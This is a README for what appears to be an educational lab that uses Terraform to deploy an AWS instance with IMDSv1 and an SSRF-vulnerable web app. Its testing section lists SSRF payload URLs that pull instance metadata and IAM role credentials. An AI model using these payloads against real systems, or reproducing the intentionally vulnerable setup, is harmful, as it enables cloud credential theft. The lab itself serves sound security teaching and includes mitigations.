# SSRF via IMDSv1 Demo

This repository contains Terraform configurations to set up a demonstration environment for Server-Side Request Forgery (SSRF) attacks targeting AWS Instance Metadata Service version 1 (IMDSv1).

## ⚠️ Security Warning

**This repository is for educational and security testing purposes only.** The infrastructure created by this Terraform configuration intentionally contains security vulnerabilities. Do not deploy this in production environments or with sensitive data.

- Only deploy in isolated AWS accounts dedicated to security testing
- Ensure proper cleanup after testing
- Follow responsible disclosure practices if testing on systems you don't own

## Overview

This demo creates:
- An EC2 instance with IMDSv1 enabled (vulnerable configuration)
- A simple web application vulnerable to SSRF
- Necessary networking and security groups
- IAM roles and policies to demonstrate privilege escalation risks

## Prerequisites

### 1. AWS Account Setup
- AWS account with appropriate permissions to create EC2 instances, VPCs, IAM roles
- Recommended: Use a dedicated AWS account for security testing

### 2. Install AWS CLI

#### macOS (using Homebrew)
```bash
brew install awscli
```

#### Linux (using curl)
```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

#### Windows
Download and run the AWS CLI MSI installer from the [official AWS documentation](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html).

### 3. Configure AWS Credentials

```bash
aws configure
```

Enter your:
- AWS Access Key ID
- AWS Secret Access Key  
- Default region (e.g., `us-east-1`)
- Default output format (`json` recommended)

Verify configuration:
```bash
aws sts get-caller-identity
```

### 4. Install Terraform

#### macOS (using Homebrew)
```bash
brew tap hashicorp/tap
brew install hashicorp/tap/terraform
```

#### Linux (Ubuntu/Debian)
```bash
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install terraform
```

#### Windows (using Chocolatey)
```powershell
choco install terraform
```

Verify installation:
```bash
terraform version
```

## Quick Start

### 1. Clone the Repository
```bash
git clone https://github.com/ethicalPap/IMDSv1_SSRF_Demo.git
cd ssrf-imdsv1-demo
```

### 2. Initialize Terraform
```bash
terraform init
```

### 3. Review the Plan
```bash
terraform plan
```

### 4. Deploy the Infrastructure
```bash
terraform apply
```

Type `yes` when prompted to confirm the deployment.


## Testing the SSRF Vulnerability

### 1. Access the Vulnerable Application
Navigate to the public IP of the ec2 instance.

### 2. Basic SSRF Test
Try accessing the instance metadata service:
```
http://<website address or ip>/?fetch=http:169.254.169.254/latest/meta-data/
```

### 3. Retrieve Instance Metadata
Common IMDSv1 endpoints to test:
- `http://<website address or ip>/?fetch=http:169.254.169.254/latest/meta-data/instance-id`
- `http://<website address or ip>/?fetch=http:169.254.169.254/latest/meta-data/local-ipv4`
- `http://<website address or ip>/?fetch=http:169.254.169.254/latest/meta-data/public-ipv4`
- `http://<website address or ip>/?fetch=http:169.254.169.254/latest/meta-data/iam/security-credentials/`

### 4. Retrieve IAM Credentials
If IAM roles are attached:
```
http://<website address or ip>/?fetch=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
```

This will return temporary AWS credentials that could be used for privilege escalation.

## Understanding the Attack

### IMDSv1 vs IMDSv2
- **IMDSv1**: Simple HTTP GET requests, vulnerable to SSRF
- **IMDSv2**: Requires session tokens, provides SSRF protection

### Attack Scenario
1. Attacker finds SSRF vulnerability in web application
2. Attacker crafts requests to AWS metadata service
3. Attacker retrieves instance metadata and IAM credentials
4. Attacker uses credentials to access AWS resources

## Mitigation Strategies

### 1. Upgrade to IMDSv2
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

### 2. Application-Level Protections
- Input validation and sanitization
- URL allowlisting
- Network segmentation
- WAF rules

### 3. Infrastructure Protections
- Disable IMDS if not needed
- Use least-privilege IAM policies
- Network ACLs and security groups
- VPC endpoints for AWS services

## Cleanup

**Important**: Always clean up resources after testing to avoid unnecessary charges.

```bash
terraform destroy
```

Type `yes` when prompted to confirm the destruction.

## Troubleshooting

### Common Issues

**Terraform Init Fails**
- Ensure AWS credentials are configured correctly
- Check internet connectivity for provider downloads

**Apply Fails with Permission Errors**
- Verify IAM permissions for required AWS services
- Check AWS service limits in your region

**Cannot Connect to Instance**
- Verify security group allows SSH (port 22) from your IP
- Ensure correct key pair is specified

**Web Application Not Accessible**
- Check security group allows HTTP (port 80/443)
- Verify instance has completed initialization

## Additional Resources

- [AWS Instance Metadata Service Documentation](https://docs.aws.amazon.com/EC2/latest/UserGuide/ec2-instance-metadata.html)
- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS Security Best Practices](https://aws.amazon.com/architecture/security-identity-compliance/)

## Contributing

Please read our contributing guidelines and ensure all security testing is conducted responsibly and ethically.

## Disclaimer

This software is provided for educational purposes only. Users are responsible for ensuring they have proper authorization before testing on any systems. The authors are not responsible for any misuse of this software.